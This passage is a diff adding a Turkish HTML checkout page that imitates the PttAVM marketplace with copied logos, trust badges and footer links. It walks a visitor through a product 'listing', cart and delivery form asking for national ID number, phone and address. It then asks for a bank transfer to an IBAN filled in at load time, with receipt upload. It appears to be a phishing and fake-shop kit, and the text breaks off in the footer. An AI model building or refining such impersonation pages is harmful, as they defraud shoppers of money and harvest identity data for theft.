@@ -1,0 +1,790 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Güvenli Alışveriş</title>
+    <style>
+        :root {
+            --primary-yellow: #fcd55c; 
+            --primary-blue: #46b3cf; 
+            --price-green: #00a651;
+            --badge-blue-bg: #e0f2f5;
+            --badge-blue-text: #008c99;
+            --badge-green-bg: #e6f4ea;
+            --badge-green-text: #28a745;
+            --text-dark: #333333;
+            --text-gray: #666666;
+            --bg-color: #ffffff;
+            --border-color: #e0e0e0;
+            --search-icon-color: #767676;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #f5f5f5; color: var(--text-dark); display: flex; justify-content: center; }
+        .app-container { width: 100%; max-width: 480px; background: var(--bg-color); min-height: 100vh; position: relative; }
+
+        /* HEADER VE ARAMA */
+        .header { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; background-color: #fff; border-bottom: 1px solid #f0f0f0; }
+        .hamburger-btn { background: none; border: none; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+        .hamburger-btn svg { width: 28px; height: 28px; stroke: #333; }
+        .logo-container { flex: 1; display: flex; justify-content: center; align-items: center; }
+        .logo-container .logo-text { font-size: 22px; font-weight: 800; color: #0059a3; letter-spacing: -0.5px; }
+        .logo-container .logo-text span { color: #fcd55c; }
+        .cart-btn { background: none; border: none; cursor: pointer; display: flex; align-items: center; justify-content: center; position: relative;}
+        .cart-btn svg { width: 26px; height: 26px; stroke: #333; }
+        .cart-badge { position: absolute; top: -5px; right: -5px; background: #e02020; color: white; font-size: 10px; font-weight: bold; width: 16px; height: 16px; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+
+        .search-section { padding: 10px 15px; background-color: #fff; border-bottom: 1px solid var(--border-color); }
+        .search-box { display: flex; width: 100%; height: 42px; border: 1px solid #767676; border-radius: 4px; overflow: hidden; background: #fff; align-items: center;}
+        .search-box input { flex: 1; border: none; padding: 0 15px; font-size: 14px; outline: none; background: transparent;}
+        .search-box button { width: 45px; background: transparent; border: none; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+        .search-box button svg { width: 20px; height: 20px; stroke: var(--search-icon-color); fill: none; stroke-width: 2;}
+
+        .checkout-header { display: none; text-align: center; padding: 15px; background: #fff; border-bottom: 1px solid #eee; position: sticky; top: 0; z-index: 10; }
+        .checkout-header .logo-text { font-size: 24px; font-weight: 800; color: #0059a3; }
+        .checkout-header .logo-text span { color: #fcd55c; }
+
+        .step-container { display: none; background: #f5f5f5; padding-bottom: 20px;}
+        .step-container.active { display: block; animation: fadeIn 0.2s; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        /* ADIM 1: VİTRİN */
+        .gallery-wrap { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; background: #fff; }
+        .gallery-wrap::-webkit-scrollbar { display: none; }
+        .gallery-wrap img { width: 100%; height: 320px; flex-shrink: 0; object-fit: contain; scroll-snap-align: center; }
+        
+        .social-share-row { display: flex; align-items: center; justify-content: center; padding: 10px 15px; background: #fff; border-bottom: 5px solid #f5f5f5; gap: 15px; }
+        .social-share-row span { font-size: 13px; color: var(--text-dark); }
+        .social-icon { width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; }
+        .fb-icon { background-color: #1877f2; } .dark-icon { background-color: #333; }
+        .social-icon svg { width: 16px; height: 16px; fill: currentColor; stroke: none; }
+
+        .product-details { padding: 15px; background: #fff; border-bottom: 5px solid #f5f5f5; }
+        .product-title { font-size: 18px; font-weight: 400; color: var(--text-dark); margin-bottom: 5px; line-height: 1.3; }
+        .product-subtitle { font-size: 12px; color: var(--text-gray); margin-bottom: 10px; }
+        .rating-row { display: flex; align-items: center; gap: 5px; margin-bottom: 15px; }
+        .stars svg { width: 14px; height: 14px; fill: #e0e0e0; }
+        .rating-text { font-size: 12px; color: var(--text-dark); text-decoration: underline; }
+        .product-price { font-size: 32px; font-weight: 700; color: var(--price-green); margin-bottom: 10px; }
+        
+        .badges-row { display: flex; flex-direction: column; gap: 8px; margin-bottom: 20px; align-items: flex-start;}
+        .badge-kargo { display: flex; align-items: center; gap: 5px; background-color: var(--badge-blue-bg); color: var(--badge-blue-text); padding: 6px 12px; border-radius: 20px; font-size: 13px; font-weight: 600; }
+        .badge-kargo svg { width: 18px; height: 18px; stroke: currentColor; fill: none; stroke-width: 2;}
+        .badge-indirim { background-color: var(--badge-green-bg); color: var(--badge-green-text); padding: 4px 10px; border-radius: 4px; font-size: 12px; font-weight: 600; }
+
+        .quantity-box { display: flex; align-items: center; border: 1px solid #ccc; border-radius: 6px; width: 100px; height: 40px; overflow: hidden; margin-bottom: 25px; }
+        .qty-btn { flex: 1; background: #fff; border: none; font-size: 18px; color: #666; }
+        .qty-input { width: 40px; border: none; border-left: 1px solid #ccc; border-right: 1px solid #ccc; text-align: center; font-size: 16px; font-weight: 600; }
+
+        .action-list { display: flex; flex-direction: column; gap: 15px; border-top: 1px solid #eee; padding-top: 20px; }
+        .action-item { display: flex; align-items: center; gap: 10px; font-size: 15px; color: var(--text-dark); }
+        .action-item svg { width: 24px; height: 24px; stroke: var(--text-dark); fill: none; stroke-width: 1.5; }
+
+        .trust-section { padding: 20px 15px; background: #fff; border-bottom: 5px solid #f5f5f5; display: flex; flex-direction: column; gap: 20px; }
+        .trust-item { display: flex; gap: 15px; align-items: flex-start; }
+        .trust-icon { width: 28px; height: 28px; flex-shrink: 0; }
+        .trust-icon svg { width: 100%; height: 100%; stroke: var(--text-dark); fill: none; stroke-width: 1.5; }
+        .trust-text h4 { font-size: 14px; font-weight: 600; margin-bottom: 3px; }
+        .trust-text p { font-size: 12px; color: var(--text-gray); line-height: 1.4; }
+
+        .accordion-container { background: #fff; margin-bottom: 10px; }
+        .accordion-item { border-bottom: 1px solid #eee; }
+        .accordion-header { display: flex; justify-content: space-between; align-items: center; padding: 18px 15px; font-size: 16px; font-weight: 600; cursor: pointer; }
+        .accordion-header svg { width: 20px; height: 20px; stroke: var(--text-dark); fill: none; transition: 0.3s; }
+        .accordion-body { padding: 0 15px 20px 15px; display: none; font-size: 14px; color: var(--text-gray); line-height: 1.6; }
+        .accordion-body.active { display: block; }
+        .ozellik-table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+        .ozellik-table tr { border-bottom: 1px solid #f5f5f5; }
+        .ozellik-table td { padding: 10px 0; font-size: 13px; }
+        .ozellik-table td:first-child { color: var(--text-dark); width: 40%; }
+        .ozellik-table td:last-child { color: var(--text-dark); font-weight: 500; }
+
+        .populer-urunler-tabs { background: #fff; padding: 15px; display: flex; gap: 15px; border-bottom: 1px solid #eee; margin-bottom: 15px; }
+        .populer-tab { font-size: 14px; font-weight: 600; color: var(--text-dark); padding-bottom: 8px; border-bottom: 2px solid transparent; cursor: pointer; }
+        .populer-tab.active { color: #0059a3; border-bottom-color: #0059a3; }
+
+        /* ========================================= */
+        /* DEV PTT AVM FOOTER & GÜVEN DAMGALARI */
+        /* ========================================= */
+        #globalFooter { background: #fff; display: none; } 
+        .f-container { padding: 25px 20px; border-top: 1px solid #eee; }
+        .f-title { font-size: 15px; font-weight: bold; color: #333; margin-bottom: 15px; margin-top: 25px;}
+        .f-title:first-child { margin-top: 0; }
+        .f-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px 10px; }
+        .f-grid a { color: #555; text-decoration: none; font-size: 13px; display: block; }
+        
+        .f-apps { margin-top: 30px; }
+        .f-apps h4 { font-size: 14px; color: #333; margin-bottom: 10px; }
+        .f-app-row { display: flex; gap: 8px; margin-bottom: 20px; overflow-x: auto;}
+        .f-app-badge { border: 1px solid #ddd; border-radius: 6px; padding: 8px; display: flex; align-items: center; gap: 8px; flex: 1; min-width: 120px; background: #fff;}
+        .f-app-badge svg { width: 20px; height: 20px; }
+        .f-app-text { font-size: 10px; color: #666; line-height: 1.2; }
+        .f-app-text b { color: #333; font-size: 11px; display: block; }
+
+        /* KUSURSUZ ETBİS VE TR GO TASARIMI */
+        .f-trust-logos { display: flex; gap: 20px; align-items: center; margin-top: 25px; margin-bottom: 30px; }
+        
+        /* GERÇEK KAREKODLU ETBİS (Bozmadan korundu) */
+        .etbis-container { display: flex; flex-direction: column; align-items: center; width: 75px; }
+        .etbis-qr-wrapper { position: relative; width: 70px; height: 70px; }
+        .etbis-qr-wrapper img { width: 100%; height: 100%; }
+        .etbis-center { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fff; width: 36px; height: 24px; display: flex; align-items: center; justify-content: center; border-radius: 2px; }
+        .etbis-text { font-size: 10px; font-weight: 900; color: #e61d2b; font-family: Arial, sans-serif; letter-spacing: -0.3px; text-align: center; margin-top: 4px; line-height: 1.1; }
+
+        /* SAAT GİBİ BÖLÜNMÜŞ İNCE TR GO ROZETİ */
+        .trgo-badge { position: relative; width: 70px; height: 70px; margin-top: -18px; }
+
+        .trgo-badge svg { width: 100%; height: 100%; }
+
+        /* ÇIPLAK VE SİYAH SOSYAL MEDYA İKONLARI */
+        .f-social { margin-bottom: 20px; }
+        .f-social h4 { font-size: 14px; color: #333; margin-bottom: 15px; }
+        .social-icons-row { display: flex; gap: 15px; align-items: center;}
+        .s-icon { display: flex; align-items: center; justify-content: center; text-decoration: none; }
+        .s-icon svg { width: 22px; height: 22px; fill: #333; }
+        .s-icon.ig svg { fill: none; stroke: #333; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
+
+        .f-dark-bottom { background: #2b3137; padding: 20px; color: #aaa; font-size: 11px; line-height: 1.5; }
+        .f-dark-bottom .ptt-logo { color: #46b3cf; font-size: 16px; font-weight: bold; font-style: italic; margin-bottom: 10px;}
+        .payment-logos { display: flex; gap: 10px; margin-top: 15px; }
+        .pay-icon { background: #fff; color: #0059a3; padding: 2px 6px; border-radius: 3px; font-weight: 900; font-size: 11px; font-style: italic;}
+
+        /* ========================================= */
+        /* ADIM 2: SEPET EKRANI */
+        /* ========================================= */
+        .cart-page-header { padding: 15px; background: #fff; display: flex; align-items: center; gap: 10px; border-bottom: 1px solid #eee; font-size: 20px; font-weight: bold; color: #333;}
+        .cart-page-header svg { width: 24px; height: 24px; stroke: #333; fill: none; stroke-width: 2;}
+        .cart-card { background: #fff; margin: 15px; border-radius: 8px; border: 1px solid #eee; overflow: hidden; }
+        .cart-store-header { padding: 12px 15px; background: #fafafa; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; font-size: 13px; color: #666; }
+        .cart-store-header b { color: #333; font-size: 14px;}
+        .cart-free-shipping { color: var(--price-green); font-weight: bold; }
+        .cart-item-row { padding: 15px; display: flex; gap: 15px; position: relative; }
+        .cart-item-img { width: 80px; height: 80px; border-radius: 6px; object-fit: cover; border: 1px solid #eee; }
+        .cart-item-info { flex: 1; }
+        .cart-item-title { font-size: 14px; color: #333; margin-bottom: 5px; padding-right: 20px; line-height: 1.4;}
+        .cart-trash { position: absolute; right: 15px; top: 15px; }
+        .cart-trash svg { width: 18px; height: 18px; stroke: #888; fill: none; stroke-width: 1.5; }
+        .cart-item-price-row { display: flex; justify-content: space-between; align-items: flex-end; margin-top: 15px; }
+        .cart-item-price { font-size: 16px; font-weight: bold; color: #333; }
+
+        .summary-card { background: #fff; margin: 15px; padding: 15px; border-radius: 8px; border: 1px solid #eee; }
+        .summary-title { font-size: 16px; font-weight: bold; color: #333; margin-bottom: 15px; }
+        .summary-row { display: flex; justify-content: space-between; font-size: 13px; color: #666; margin-bottom: 12px; }
+        .summary-row.total { border-top: 1px solid #eee; padding-top: 15px; font-size: 16px; font-weight: bold; color: var(--price-green); margin-bottom: 0;}
+        .badge-blue { background: var(--primary-blue); color: white; padding: 3px 8px; border-radius: 4px; font-weight: bold; }
+
+        /* ADIM 3 & 4: FORM EKRANLARI */
+        .checkout-title { font-size: 16px; font-weight: bold; color: var(--primary-blue); padding: 20px 15px 10px 15px; }
+        .form-card { background: #fff; margin: 0 15px 15px 15px; border-radius: 8px; border: 1px solid #ddd; overflow: hidden; }
+        .form-input-group { border-bottom: 1px solid #eee; position: relative; }
+        .form-input-group:last-child { border-bottom: none; }
+        .form-input-group input, .form-input-group select, .form-input-group textarea { width: 100%; border: none; padding: 20px 15px; font-size: 14px; outline: none; background: transparent; color: #333; }
+        .form-input-group select { appearance: none; }
+        .form-input-group::after { content: '▼'; position: absolute; right: 15px; top: 20px; font-size: 12px; color: #999; pointer-events: none; }
+        .form-input-group input:not(select)::after { content: none; }
+        
+        .checkout-item-summary-card { background: #fff; margin: 15px; padding: 15px; border-radius: 8px; border: 1px solid #eee; display: flex; gap: 15px; align-items: center; }
+        .checkout-item-summary-img { width: 60px; height: 60px; border-radius: 6px; object-fit: cover; border: 1px solid #eee; }
+        .checkout-item-summary-info { flex: 1; }
+        .checkout-item-summary-title { font-size: 14px; color: #333; margin-bottom: 5px; }
+        .checkout-item-summary-price { font-size: 15px; font-weight: bold; color: #333; }
+        
+        .iban-box { background: #f9f9f9; padding: 20px; border-bottom: 1px solid #eee; }
+        .iban-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
+        .iban-row h3 { font-size: 12px; color: #666; margin-bottom: 5px; font-weight: normal; }
+        .iban-row p { font-size: 15px; font-weight: bold; color: #000; letter-spacing: 1px; }
+        .copy-btn { background: #fff; border: 1px solid var(--primary-blue); color: var(--primary-blue); padding: 6px 12px; border-radius: 4px; font-size: 12px; font-weight: bold; }
+        .upload-box { border: 2px dashed #ccc; padding: 25px 15px; text-align: center; background: #fafafa; cursor: pointer; color: #666; font-size: 14px; margin: 15px; border-radius: 8px; }
+
+        /* BUTONLAR */
+        .sticky-footer-step1 { position: fixed; bottom: 0; width: 100%; max-width: 480px; background: #fff; padding: 12px 15px; border-top: 1px solid #e0e0e0; z-index: 100; display: flex; justify-content: center; }
+        .btn-hemen-al { width: 100%; background-color: var(--primary-yellow); color: var(--text-dark); border: none; padding: 15px; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; text-align: center; transition: 0.3s;}
+        .btn-blue { background-color: var(--primary-blue); color: #fff; }
+        
+        /* Akış içindeki butonlar */
+        .inline-btn-container { padding: 0 15px 15px 15px; }
+
+        #loader { text-align: center; padding: 50px 20px; font-size: 14px; color: #666; }
+        #errorMsg { text-align: center; padding: 50px 20px; font-size: 14px; color: red; display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        
+        <div class="header" id="mainHeader">
+            <button class="hamburger-btn"><svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
+            <div class="logo-container"><div class="logo-text">Ptt<span>AVM</span></div></div>
+            <button class="cart-btn"><svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" fill="none"><circle cx="9" cy="21" r="1"></circle><circle cx="20" cy="21" r="1"></circle><path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"></path></svg><div class="cart-badge">1</div></button>
+        </div>
+
+        <div class="search-section" id="searchSection">
+            <div class="search-box">
+                <input type="text" placeholder="Arama yap">
+                <button type="button"><svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg></button>
+            </div>
+        </div>
+
+        <div class="checkout-header" id="checkoutHeader">
+            <div class="logo-text">Ptt<span>AVM</span></div>
+        </div>
+
+        <div id="loader">İlan yükleniyor...</div>
+        <div id="errorMsg">İlan bulunamadı veya süresi dolmuş.</div>
+
+        <div id="step1" class="step-container active">
+            <div class="gallery-wrap" id="v-gallery"></div>
+            <div class="social-share-row">
+                <span>Ürünü Arkadaşına Öner</span>
+                <div class="social-icon fb-icon"><svg viewBox="0 0 24 24"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg></div>
+                <div class="social-icon dark-icon"><svg viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect></svg></div>
+            </div>
+
+            <div class="product-details">
+                <h1 class="product-title" id="v-baslik">Yükleniyor...</h1>
+                <div class="product-subtitle">GARANTİLİ</div>
+                <div class="rating-row"><div class="stars"><svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg></div><span class="rating-text">Bu ürüne henüz yorum yapılmadı.</span></div>
+                
+                <div class="product-price" id="v-fiyat">... TL</div>
+
+                <div class="badges-row">
+                    <div class="badge-kargo"><svg viewBox="0 0 24 24"><rect x="1" y="3" width="15" height="13" rx="1.5"></rect><polygon points="16 8 20 8 23 11 23 16 16 16 16 8"></polygon><circle cx="5.5" cy="18.5" r="2.5"></circle><circle cx="18.5" cy="18.5" r="2.5"></circle></svg> 1 gün içinde kargoda</div>
+                    <div class="badge-indirim">İndirimli Ürün</div>
+                </div>
+                <div class="quantity-box"><button class="qty-btn">-</button><input type="text" class="qty-input" value="1" readonly><button class="qty-btn">+</button></div>
+                <div class="action-list">
+                    <div class="action-item"><svg viewBox="0 0 24 24"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path></svg> Favorilere Ekle</div>
+                    <div class="action-item"><svg viewBox="0 0 24 24"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"></path></svg> Ürün Listeme Ekle</div>
+                </div>
+            </div>
+
+            <div class="trust-section">
+                <div class="trust-item"><div class="trust-icon"><svg viewBox="0 0 24 24"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path><polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline><line x1="12" y1="22.08" x2="12" y2="12"></line></svg></div><div class="trust-text"><h4>Kargo Bedava</h4><p>Bu ürünün kargosundan ücret alınmayacak.</p></div></div>
+                <div class="trust-item"><div class="trust-icon"><svg viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><line x1="3" y1="9" x2="21" y2="9"></line><line x1="9" y1="21" x2="9" y2="9"></line></svg></div><div class="trust-text"><h4>Kargomata Teslimat</h4><p>Kargo beklemeyin paketlerinizi Kargomattan istediğiniz zaman alın.</p></div></div>
+            </div>
+
+            <div class="accordion-container">
+                <div class="accordion-item"><div class="accordion-header" onclick="toggleAccordion(this)">Ürün Açıklamaları <svg viewBox="0 0 24 24"><polyline points="6 9 12 15 18 9"></polyline></svg></div><div class="accordion-body" id="v-aciklama">Yükleniyor...</div></div>
+                <div class="accordion-item"><div class="accordion-header" onclick="toggleAccordion(this)" style="color: #008c99;">Ürün Özellikleri <svg viewBox="0 0 24 24" style="stroke: #008c99; transform: rotate(180deg);"><polyline points="6 9 12 15 18 9"></polyline></svg></div><div class="accordion-body active"><table class="ozellik-table" id="v-ozellikler"></table></div></div>
+                <div class="accordion-item"><div class="accordion-header" onclick="toggleAccordion(this)">Ürün Yorumları (0) <svg viewBox="0 0 24 24"><polyline points="6 9 12 15 18 9"></polyline></svg></div><div class="accordion-body"><div style="background: #f9f9f9; padding: 15px; border-radius: 6px; text-align: center;"><h4 style="margin-bottom: 5px; color:#333;">Ürün henüz değerlendirilmemiş</h4><p style="font-size: 12px; color:#666; margin-bottom: 15px;">İlk sen değerlendir ve yorumların sayesinde yardımcı ol!</p><button style="background: #008c99; color: white; border: none; padding: 8px 15px; border-radius: 4px; font-weight: 600;">Ürünü Değerlendir</button></div></div></div>
+            </div>
+
+            <div class="populer-urunler-tabs">
+                <div class="populer-tab active">Popüler Ürünler</div><div class="populer-tab">Tüm Ürünler</div>
+            </div>
+            
+            <div style="height: 20px;"></div> </div>
+
+        <div id="step2" class="step-container">
+            <div class="cart-page-header"><svg viewBox="0 0 24 24"><circle cx="9" cy="21" r="1"></circle><circle cx="20" cy="21" r="1"></circle><path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"></path></svg> Sepet (1)</div>
+
+            <div class="cart-card">
+                <div class="cart-store-header"><span>Mağaza:<br><b>PttAVM</b></span><span class="cart-free-shipping">Kargo Bedava</span></div>
+                <div class="cart-item-row">
+                    <img src="" id="c-resim" class="cart-item-img">
+                    <div class="cart-item-info">
+                        <div class="cart-item-title" id="c-baslik">Yükleniyor...</div>
+                        <span class="badge-indirim">İndirimli Ürün</span>
+                        <div class="cart-trash"><svg viewBox="0 0 24 24"><polyline points="3 6 5 6 21 6"></polyline><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path></svg></div>
+                        <div class="cart-item-price-row">
+                            <div class="quantity-box" style="margin-bottom:0; height: 32px; width: 80px;"><button class="qty-btn" style="font-size:14px;">-</button><input type="text" class="qty-input" value="1" style="font-size:14px;" readonly><button class="qty-btn" style="font-size:14px;">+</button></div>
+                            <div class="cart-item-price" id="c-fiyat">... TL</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="summary-title" style="margin: 20px 15px 10px 15px;">Sipariş Özeti</div>
+            <div class="summary-card">
+                <h4 style="margin-bottom: 15px; font-size:15px; color:#333;">1 Ürün</h4>
+                <div class="summary-row"><span>Ara Toplam:</span><span id="o-ara-toplam" style="color:#333; font-weight:bold;">... TL</span></div>
+                <div class="summary-row"><span>Kargo ve Lojistik Hizmet Bedeli:</span><span class="badge-blue">Ücretsiz</span></div>
+                <div class="summary-row total"><span>Toplam:</span><span id="o-toplam">... TL</span></div> </div>
+            
+            <div class="inline-btn-container">
+                <button class="btn-hemen-al btn-blue" id="btnIleriStep2">Ürünleri Kontrol Ettim</button>
+            </div>
+        </div>
+
+        <div id="step3" class="step-container">
+            <div class="checkout-title">Teslimat Bilgileri</div>
+            
+            <div class="form-card">
+                <div class="form-input-group"><input type="text" id="aliciAd" placeholder="İsim *"></div>
+                <div class="form-input-group"><input type="text" id="aliciSoyad" placeholder="Soyisim *"></div>
+                <div class="form-input-group"><input type="email" id="aliciMail" placeholder="E-Posta"></div>
+                <div class="form-input-group"><select id="aliciIl"><option value="">İl *</option></select></div>
+                <div class="form-input-group"><select id="aliciIlce" disabled><option value="">İlçe *</option></select></div>
+                <div class="form-input-group"><input type="text" id="aliciMahalle" placeholder="Mahalle / Köy *"></div>
+                <div class="form-input-group"><input type="tel" id="aliciTel" placeholder="Telefon Numarası *"></div>
+                <div class="form-input-group"><input type="text" id="aliciTC" placeholder="TC Kimlik Numaranız *"></div>
+                <div class="form-input-group"><textarea id="aliciAdres" rows="3" placeholder="Adres *"></textarea></div>
+            </div>
+
+            <div class="summary-title" style="margin: 20px 15px 10px 15px;">Sipariş Özeti</div>
+            <div class="summary-card" style="margin-top:0; margin-bottom:0; border-bottom-left-radius:0; border-bottom-right-radius:0;">
+                <div class="summary-row"><span>Ara Toplam:</span><span id="o2-ara-toplam" style="color:#333; font-weight:bold;">... TL</span></div>
+                <div class="summary-row"><span>Kargo ve Lojistik Hizmet Bedeli:</span><span class="badge-blue">Ücretsiz</span></div>
+                <div class="summary-row total" style="margin-bottom: 10px;"><span>Toplam:</span><span id="o2-toplam">... TL</span></div>
+            </div>
+            
+            <div class="checkout-item-summary-card" style="margin-top:0; border-top:none; border-top-left-radius:0; border-top-right-radius:0; background:#fafafa;">
+                <img src="" id="c3-resim" class="checkout-item-summary-img">
+                <div class="checkout-item-summary-info">
+                    <div class="checkout-item-summary-title" id="c3-baslik">...</div>
+                    <div class="checkout-item-summary-price" id="c3-fiyat">...</div>
+                </div>
+            </div>
+
+            <div class="inline-btn-container">
+                <button class="btn-hemen-al btn-blue" id="btnIleriStep3">Ödemeye Geç</button>
+            </div>
+        </div>
+
+        <div id="step4" class="step-container">
+            <div class="checkout-title">Banka Havalesi / EFT</div>
+            
+            <div style="background: #fff; margin: 0 15px 15px 15px; border-radius: 8px; border: 1px solid #ddd; overflow: hidden;">
+                <div class="iban-box">
+                    <p style="font-size: 13px; color: #555; margin-bottom: 15px; line-height: 1.4;">Siparişi tamamlamak için hesaba ödemenizi yapın ve dekontunuzu yükleyin.</p>
+                    <div class="iban-row">
+                        <div><h3>ALICI IBAN</h3><p id="odeme-iban">TR00 0000...</p></div>
+                        <button class="copy-btn" onclick="kopyalaMetin('odeme-iban')">Kopyala</button>
+                    </div>
+                    <hr style="border: none; border-top: 1px solid #eee; margin-bottom: 15px;">
+                    <div class="iban-row" style="margin-bottom: 0;">
+                        <div><h3>ALICI AD SOYAD</h3><p id="odeme-isim">...</p></div>
+                        <button class="copy-btn" onclick="kopyalaMetin('odeme-isim')">Kopyala</button>
+                    </div>
+                </div>
+
+                <input type="file" id="dekontSecici" accept="image/*" style="display: none;">
+                <div class="upload-box" id="dekontKutusu">
+                    Dekont Eklemek İçin Tıklayın<br>
+                    <span style="font-size: 11px; color:#999; display:block; margin-top:5px;">(Max 5MB - JPG/PNG)</span>
+                </div>
+                <div id="dekontDurum" style="margin-top: 15px; padding-bottom: 20px; text-align: center; font-size: 14px; font-weight: bold; color: var(--price-green);"></div>
+            </div>
+
+            <div class="inline-btn-container">
+                <button class="btn-hemen-al btn-blue" id="btnIleriStep4">Siparişi Tamamla</button>
+            </div>
+        </div>
+
+        <div class="sticky-footer-step1" id="stickyBottomBar" style="display: none;">
+            <button class="btn-hemen-al" id="btnIleriStep1">Hemen Al</button>
+        </div>
+
+        <div id="globalFooter">
+            <div class="f-container">
+                <div class="f-title">PttAVM.com</div>
+                <div class="f-grid">
+                    <a href="#">Blog Sayfamız</a><a href="#">Hakkımızda</a>
+                    <a href="#">Güvenli E-Ticaret</a><a href="#">Gizlilik Bilgileri</a>
+                    <a href="#">Üyelik Sözleşmesi</a><a href="#">Araç KM Sorgulama</a>
+                    <a href="#">Mağazalar</a><a href="#">MTV Ödeme</a>
+                    <a href="#">Hasar Sorgula</a><a href="#">Trafik Cezası Ödeme</a>
+                    <a href="#">Kargomat'a Teslimat</a>
+                </div>
+
+                <div class="f-title">Popüler Sayfalar</div>
+                <div class="f-grid">
+                    <a href="#">Kozmetik & Sağlık</a><a href="#">Süpermarket</a>
+                    <a href="#">Kampanyalar</a><a href="#">Cep Telefonu</a>
+                    <a href="#">Bebek Bezi</a><a href="#">Kuruyemiş</a>
+                    <a href="#">Televizyon</a>
+                </div>
+
+                <div class="f-title">Yenilenmiş Ürün Kategorileri</div>
+                <div class="f-grid">
+                    <a href="#">Yenilenmiş İkinci El Telefon</a><a href="#">Yenilenmiş İkinci El Bilgisayar</a>
+                    <a href="#">Yenilenmiş İkinci El Teknolojik Ürünler</a><a href="#">Yenilenmiş İkinci El Tablet</a>
+                </div>
+
+                <div class="f-title">Teknoloji</div>
+                <div class="f-grid">
+                    <a href="#">Cep Telefonu</a><a href="#">Masaüstü Bilgisayar</a>
+                    <a href="#">Laptop</a><a href="#">Akıllı Saat</a>
+                    <a href="#">Tablet</a>
+                </div>
+
+                <div class="f-title">Beyaz Eşya</div>
+                <div class="f-grid">
+                    <a href="#">Ankastre Set</a><a href="#">Ocak</a>
+                    <a href="#">Buzdolabı</a><a href="#">Fırın</a>
+                    <a href="#">Davlumbaz</a><a href="#">Çamaşır Makinesi</a>
+                    <a href="#">Bulaşık Makinesi</a><a href="#">Kurutma Makinesi</a>
+                    <a href="#">Derin Dondurucu</a><a href="#">Mikrodalga Fırın</a>
+                </div>
+
+                <div class="f-title">Destek Hattı</div>
+                <div class="f-grid">
+                    <a href="#">İletişim</a><a href="#">Sıkça Sorulan Sorular</a>
+                    <a href="#">Ürün İade</a><a href="#">Çerez Politikası</a>
+                    <a href="#">İşlem Rehberi</a><a href="#">Hediye Çeki Kullanım Kılavuzu</a>
+                </div>
+
+                <div class="f-apps">
+                    <h4>PttAVM Mobil Uygulamalarımız</h4>
+                    <div class="f-app-row">
+                        <div class="f-app-badge"><svg viewBox="0 0 24 24" fill="#333"><path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.17 2.31-.93 3.57-.84 1.51.11 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.53 4.08zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/></svg><div class="f-app-text">App Store'dan <b>İndirebilirsiniz</b></div></div>
+                        <div class="f-app-badge"><svg viewBox="0 0 24 24" fill="#34a853"><polygon points="3 3 3 21 15 12"></polygon><polygon points="15 12 3 21 21 12" fill="#ea4335"></polygon><polygon points="3 3 15 12 21 12" fill="#4285f4"></polygon><polygon points="15 12 3 3 21 12" fill="#fbbc04"></polygon></svg><div class="f-app-text">Google Play'den <b>İndirebilirsiniz</b></div></div>
